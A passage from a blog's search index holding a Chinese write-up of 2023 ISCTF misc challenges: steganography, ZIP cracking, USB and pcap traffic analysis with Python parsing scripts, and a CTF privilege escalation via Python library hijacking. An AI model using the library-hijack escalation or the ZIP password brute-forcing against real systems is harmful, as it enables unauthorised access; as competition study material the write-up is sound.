<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2023ISCTF部分WP</title>
      <link href="/2023/11/30/2023ISCTF%E9%83%A8%E5%88%86WP/"/>
      <url>/2023/11/30/2023ISCTF%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>关注公众号，回复关键词：小蓝鲨，我想打ctf</p><h3 id="你说爱我？尊嘟假嘟"><a href="#你说爱我？尊嘟假嘟" class="headerlink" title="你说爱我？尊嘟假嘟"></a>你说爱我？尊嘟假嘟</h3><p>打开是一个docx文档，里面重重复复只有三句话， 你说爱我，尊嘟，假嘟，考虑其跟Ook的解密相性很大，尝试后将</p><pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">你说爱我  ->  Ook.尊嘟   ->  Ook!假嘟   ->  Ook?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>解密得到base64编码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011951795.png">然后进行base64解密得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011953943.png"></p><h3 id="小蓝鲨的秘密"><a href="#小蓝鲨的秘密" class="headerlink" title="小蓝鲨的秘密"></a>小蓝鲨的秘密</h3><p>打开压缩包发现里面俩个文件都被加密，用010打开可以发现其是伪加密</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011955168.png"></p><p>flag.txt里面给的是一个密文</p><p><strong>U2FsdGVkX1&#x2F;ij5Hxtt6G8tDvbXIQcMLJ6isLpLmxqxW8mOmFIB4DgBGXSR3ceEcj</strong></p><p>图片则是发现高度好像有点问题，修改高度可以得到密钥  <strong>15CTF2023</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011956415.png"></p><p>经查询可以得知其为<strong>AES加密</strong>，上网搜索解密网站得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312011959426.png"></p><h3 id="PNG的基本食用"><a href="#PNG的基本食用" class="headerlink" title="PNG的基本食用"></a>PNG的基本食用</h3><p>三张图片，显而易见考的图片的三种考法</p><p>第一张图片（考查图片宽高）</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312012002905.png"></p><p>第二张图片（考查stegsolve的使用）</p><p>进入stegsolve然后进行data extract，选rgb全低位即可找到中段flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312012004652.png"></p><p>第三张图片（010里面可以找到）</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202312012003367.png"></p><p>但我怎么感觉这题好像是想考分离文件，里面应该是有一个part3.txt文件。</p><h3 id="MCSOG-猫猫"><a href="#MCSOG-猫猫" class="headerlink" title="MCSOG-猫猫"></a><strong>MCSOG-猫猫</strong></h3><p>群里面有一个机器人就叫本题题目的名字，对她发送 <strong>flag在哪</strong> 会收到一个信息</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301037157.png"></p><p>将该信息复制放入linux的文件中，通过vim查看可以发现其中有零宽字符隐写</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301038155.png"></p><p>发现其中有&lt;200c&gt;、&lt;202c&gt;、&lt;200e&gt;，将其放入<a href="https://www.mzy0.com/ctftools/zerowidth1/">零宽字符隐写解密网站</a>，勾选其中与其相关的零宽度字符，解密得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301040700.png"></p><h3 id="镜流"><a href="#镜流" class="headerlink" title="镜流"></a>镜流</h3><p>打开压缩包是加密的俩个文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301050450.png"></p><p>通过010查看不是伪加密，考虑为需要爆破解密</p><p>得到密码  <strong>306256</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301106885.png"></p><p>得到一张图片和一个提示，<strong>提示为  把图片缩小10倍</strong></p><p>通过图片我们可以看到其上面有很多像素点，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301108993.png"></p><p>通过从网上找的大佬代码修改一下将其缩小十倍</p><pre class="line-numbers language-highlight python"><span class="keyword">from</span> PIL <span class="keyword"><code class="language-highlight python"><span class="keyword">from</span> PIL <span class="keyword">import</span> Imageimg = Image.<span class="built_in">open</span>(<span class="string">r"1new.png"</span>)w = img.widthh = img.heightimg_obj = Image.new(<span class="string">"RGB"</span>,(w//<span class="number">10</span>,h//<span class="number">10</span>))<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w//<span class="number">10</span>):    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h//<span class="number">10</span>):        (r,g,b)=img.getpixel((x*<span class="number">10</span>,y*<span class="number">10</span>))        img_obj.putpixel((x,y),(r,g,b))img_obj.save(<span class="string">&#x27;ok2.png&#x27;</span>)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到一张新的图片</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301111311.png"></p><p>用<strong>stegsolver</strong>打开进行<strong>data extract</strong>发现其藏了一张png图片</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301212732.png"></p><p>保存图片打开得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301213226.png"></p><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h3><p>本题是一道流量题，打开搜索http发现其有sql注入相关的信息，考虑为sql日志分析</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301215941.png"></p><p>首先通过kali虚拟机来分离出这些sql语句</p><blockquote><p>通过该指令</p><p>tshark -r te.pcapng -Y “http.request” -T fields -e http.request.full_uri &gt; data.txt</p><p>来得到其url</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301218223.png"></p><p>得到后需要在进行一次URL解码从而与脚本对应上</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301226346.png"></p><p>然后通过网上大佬的代码来运行得到flag</p><pre class="line-numbers language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment"># 读取输入文件</span><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xxx&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:    lines = file.readlines()<span class="comment"># 初始化上一行指定位置的数字</span>prev_digit_position = <span class="number">0</span><span class="comment"># 遍历每一行数据</span><span class="keyword">for</span> line <span class="keyword">in</span> lines:    <span class="comment"># 获取当前行指定位置的数字</span>    start_index = line.find(<span class="string">"SELECT flag from answer limit 0,1),"</span>) + <span class="built_in">len</span>(<span class="string">"SELECT flag from answer limit 0,1),"</span>)    end_index = line.find(<span class="string">",1))="</span>)       <span class="keyword">if</span> start_index != -<span class="number">1</span> <span class="keyword">and</span> end_index != -<span class="number">1</span>:        digit_position = <span class="built_in">int</span>(line[start_index:end_index])        <span class="comment"># 检查指定位置的数字是否发生变化</span>        <span class="keyword">if</span> prev_digit_position + <span class="number">1</span> == digit_position:            <span class="comment"># 输出当前行的上一行指定位置的数据</span>            prev_line = lines[lines.index(line) - <span class="number">1</span>]            start_shuju = prev_line.find(<span class="string">",1))="</span>) + <span class="built_in">len</span>(<span class="string">",1))="</span>)            end_shuju = prev_line.find(<span class="string">"--"</span>)            <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(prev_line[start_shuju:end_shuju])),end=<span class="string">""</span>)        <span class="comment"># 更新上一行指定位置的数字</span>        prev_digit_position = digit_position<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该代码出自<a href="https://blog.csdn.net/Nanian233/article/details/134699360?ops_request_misc=%7B%22request_id%22:%22170131018416800185840663%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=170131018416800185840663&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~times_rank-2-134699360-null-null.142%5Ev96%5Epc_search_result_base7&utm_term=2023ISCTF&spm=1018.2226.3001.4187">该大佬博客</a></p><p>运行脚本得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301227680.png" alt="、"></p><h3 id="小白小黑"><a href="#小白小黑" class="headerlink" title="小白小黑"></a>小白小黑</h3><p>这个题打开靶机后，看到一堆数字</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301253393.png"></p><p>放入txt中，发现行256，列257，跟二维码十分的像啊，考虑通过代码来生成</p><pre class="line-numbers language-highlight python"><span class="keyword">from</span> PIL <span class="keyword"><code class="language-highlight python"><span class="keyword">from</span> PIL <span class="keyword">import</span> Imageimg = Image.new(<span class="string">&#x27;L&#x27;</span>, (<span class="number">256</span>, <span class="number">256</span>))<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;qrcode.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:    data = f.readlines()<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):        pixel_value = <span class="built_in">int</span>(data[j][i])        img.putpixel((j, i), pixel_value)img.save(<span class="string">&#x27;2.png&#x27;</span>)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题当时做的时候我一直在考虑英文有什么用，到现在也不知道(尴尬)，生成得到一个黑色图片，放到stegsolve里面看看</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301302117.png"></p><p>发现藏着一个二维码图片，扫码可以获得flag</p><h3 id="张万森-下雪了"><a href="#张万森-下雪了" class="headerlink" title="张万森,下雪了"></a>张万森,下雪了</h3><p>打开后压缩包一个加密的压缩包，一个dic</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301304954.png"></p><p>打开010发现压缩包不是伪加密，考虑dic.txt是该压缩包的字典，需要用到字典爆破</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301306522.png"></p><p>得到密码   <strong>blueSHARK666</strong></p><p>看似直接得到flag，但显然没有那么简单</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301307857.png"></p><p>结合题目考虑为 SNOW解密，，那么显而易见的就是另一个文件是密码咯</p><p>对tip里面的base64解密直到无法解密，然后对其进行词频分析，得到snow的密码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301317014.png"></p><p>密码为 <strong>ISCTFZ023</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301319740.png"></p><p>得到真正的flag</p><h3 id="sudopy"><a href="#sudopy" class="headerlink" title="sudopy"></a>sudopy</h3><p>先通过指令连接上该ip</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301323991.png"></p><p>查看当前位置，发现在其有着flag，但是必须是root用户才能访问</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301325955.png"></p><p>查看web.py的信息</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301326492.png"></p><p>发现其导入了一个   <strong>webbrowser</strong> 库</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301329846.png"></p><p>发现这篇文章写过与其相关的<strong>py库劫持使linux权限提升</strong><a href="https://www.freebuf.com/vuls/279298.html">Linux权限提升：Python库劫持 - FreeBuf网络安全行业门户</a></p><p>我这里用到的是另一个佬的方法</p><p>即通过os模块常用函数来通过system输出cat &#x2F;flag的指令</p><h3 id="ezUSB"><a href="#ezUSB" class="headerlink" title="ezUSB"></a>ezUSB</h3><p>这题当时做的时候我是真没想到键盘删除的东西也能有用，并且还起到了大用，最后竟然要靠这个去当密钥拿到flag，属实是长见识了。。。。。</p><p>首先这题我们最明显可以拿到的键盘流量就是2.5.1这边的HID DATA</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301335473.png"></p><p>可以通过tshark来获取这个HID DATA流量</p><p><strong>tshark -r xxx.pcapng -T fields -e usb.capdata &gt; out.txt</strong></p><p>然后再通过下面的代码将其带上冒号</p><pre class="line-numbers language-highlight python">f=<span class="built_in">open</span>(<span class="string">&#x27;out2.txt&#x27;</span>,<span class="string"><code class="language-highlight python">f=<span class="built_in">open</span>(<span class="string">&#x27;out2.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)fi=<span class="built_in">open</span>(<span class="string">&#x27;out3.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)<span class="keyword">while</span> <span class="number">1</span>:    a=f.readline().strip()    <span class="keyword">if</span> a:        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>: <span class="comment"># 鼠标流量的话len改为8</span>            out=<span class="string">&#x27;&#x27;</span>            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">":"</span>                <span class="keyword">else</span>:                    out+=a[i]+a[i+<span class="number">1</span>]            fi.write(out)            fi.write(<span class="string">&#x27;\n&#x27;</span>)    <span class="keyword">else</span>:        <span class="keyword">break</span>fi.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过该键盘分析代码得到后把那段flag</p><pre class="line-numbers language-highlight python"><code class="language-highlight python">normalKeys = {    <span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>,    <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>,     <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>,      <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>,       <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>,        <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>,         <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,         <span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"<RET>"</span>,<span class="string">"29"</span>:<span class="string">"<ESC>"</span>,<span class="string">"2a"</span>:<span class="string">"<DEL>"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,         <span class="string">"2c"</span>:<span class="string">"<SPACE>"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,         <span class="string">"32"</span>:<span class="string">"<NON>"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"&#x27;"</span>,<span class="string">"35"</span>:<span class="string">"<GA>"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,         <span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"<CAP>"</span>,<span class="string">"3a"</span>:<span class="string">"<F1>"</span>,<span class="string">"3b"</span>:<span class="string">"<F2>"</span>, <span class="string">"3c"</span>:<span class="string">"<F3>"</span>,<span class="string">"3d"</span>:<span class="string">"<F4>"</span>,         <span class="string">"3e"</span>:<span class="string">"<F5>"</span>,<span class="string">"3f"</span>:<span class="string">"<F6>"</span>,<span class="string">"40"</span>:<span class="string">"<F7>"</span>,<span class="string">"41"</span>:<span class="string">"<F8>"</span>,<span class="string">"42"</span>:<span class="string">"<F9>"</span>,<span class="string">"43"</span>:<span class="string">"<F10>"</span>,         <span class="string">"44"</span>:<span class="string">"<F11>"</span>,<span class="string">"45"</span>:<span class="string">"<F12>"</span>}shiftKeys = {    <span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>,     <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>,      <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>,       <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>,        <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>,         <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>,          <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,          <span class="string">"28"</span>:<span class="string">"<RET>"</span>,<span class="string">"29"</span>:<span class="string">"<ESC>"</span>,<span class="string">"2a"</span>:<span class="string">"<DEL>"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"<SPACE>"</span>,          <span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"{"</span>,<span class="string">"30"</span>:<span class="string">"}"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"<NON>"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,          <span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"<GA>"</span>,<span class="string">"36"</span>:<span class="string">"<"</span>,<span class="string">"37"</span>:<span class="string">">"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"<CAP>"</span>,<span class="string">"3a"</span>:<span class="string">"<F1>"</span>,          <span class="string">"3b"</span>:<span class="string">"<F2>"</span>, <span class="string">"3c"</span>:<span class="string">"<F3>"</span>,<span class="string">"3d"</span>:<span class="string">"<F4>"</span>,<span class="string">"3e"</span>:<span class="string">"<F5>"</span>,<span class="string">"3f"</span>:<span class="string">"<F6>"</span>,<span class="string">"40"</span>:<span class="string">"<F7>"</span>,          <span class="string">"41"</span>:<span class="string">"<F8>"</span>,<span class="string">"42"</span>:<span class="string">"<F9>"</span>,<span class="string">"43"</span>:<span class="string">"<F10>"</span>,<span class="string">"44"</span>:<span class="string">"<F11>"</span>,<span class="string">"45"</span>:<span class="string">"<F12>"</span>}output = []keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)<span class="keyword">for</span> line <span class="keyword">in</span> keys:    <span class="keyword">try</span>:        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">"00"</span>:             <span class="keyword">continue</span>        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]        <span class="keyword">else</span>:            output += [<span class="string">&#x27;[unknown]&#x27;</span>]    <span class="keyword">except</span>:        <span class="keyword">pass</span>keys.close()flag=<span class="number">0</span><span class="built_in">print</span>(<span class="string">""</span>.join(output))<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):    <span class="keyword">try</span>:        a=output.index(<span class="string">&#x27;<DEL>&#x27;</span>)        <span class="keyword">del</span> output[a]        <span class="keyword">del</span> output[a-<span class="number">1</span>]    <span class="keyword">except</span>:        <span class="keyword">pass</span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):    <span class="keyword">try</span>:        <span class="keyword">if</span> output[i]==<span class="string">"<CAP>"</span>:            flag+=<span class="number">1</span>            output.pop(i)            <span class="keyword">if</span> flag==<span class="number">2</span>:                flag=<span class="number">0</span>        <span class="keyword">if</span> flag!=<span class="number">0</span>:            output[i]=output[i].upper()    <span class="keyword">except</span>:        <span class="keyword">pass</span><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">""</span>.join(output))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301351589.png"></p><p>这里收集被<DEL>删除的英文字母，合起来为<strong>soezusb</strong>，即后面的维吉尼亚解密所需要的东西(就是卡在这一步了，惨。。。)。</p><p>然后还有前半段我们可以在remote()找到</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301353797.png"></p><p>39明显可以看出来是大写锁定了，步骤跟上面差不多，将Value值提取出来，然后进行上面两个代码的运行得到前半段的flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301355517.png"></p><p>然后结合起来为  </p><blockquote><p><strong>AGGSZ{Kp_wn_YRV_SOV_JMFYFFJS!!!}</strong></p></blockquote><p>密钥</p><blockquote><p>soezusb</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301357482.png"></p><h3 id="EZcrc"><a href="#EZcrc" class="headerlink" title="EZcrc"></a>EZcrc</h3><p>打开是一个压缩包里面很多txt文件，为三字节爆破，先用crc工具将其提取出来</p><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">python CRC32-Tools.py -3 flag.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301712899.png"></p><p>发现其顺序不对，通过脚本使其顺序正常</p><pre class="line-numbers language-highlight python"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword"><code class="language-highlight python"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:    content = file.readlines()data = [(line.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>].strip(), <span class="built_in">int</span>(line.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>].strip(), <span class="number">16</span>)) <span class="keyword">for</span> line <span class="keyword">in</span> content]sorted_data = <span class="built_in">sorted</span>(data, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="number">0</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>].split()[-<span class="number">1</span>]))<span class="keyword">for</span> entry <span class="keyword">in</span> sorted_data:    <span class="built_in">print</span>(<span class="string">f"<span class="subst">{entry[<span class="number">0</span>]}</span>: <span class="subst">{<span class="built_in">hex</span>(entry[<span class="number">1</span>])}</span>"</span>)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301715173.png"></p><p>然后再通过一个代码使前面的txt去掉成为标准模式</p><pre class="line-numbers language-highlight python"><span class="keyword"><code class="language-highlight python"><span class="keyword">import</span> re<span class="keyword">def</span> <span class="title function_">extract_hex</span>(<span class="params">file_content</span>):    <span class="comment"># 使用正则表达式匹配每一行txt后面的十六进制数据</span>    hex_values = re.findall(<span class="string">r&#x27;\d+\.txt:\s+(0x[0-9a-fA-F]+)&#x27;</span>, file_content)    <span class="comment"># 将十六进制数据用逗号隔开，头尾套上方括号</span>    result_str = <span class="string">&#x27;[&#x27;</span> + <span class="string">&#x27;,&#x27;</span>.join(hex_values) + <span class="string">&#x27;]&#x27;</span>    <span class="keyword">return</span> result_str<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:    <span class="comment"># 用于测试的示例文本，你需要替换成你的实际文件路径</span>    file_path = <span class="string">"b.txt"</span>    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:        example_text = file.read()        result = extract_hex(example_text)        <span class="built_in">print</span>(result)<span aria-hidden="true" 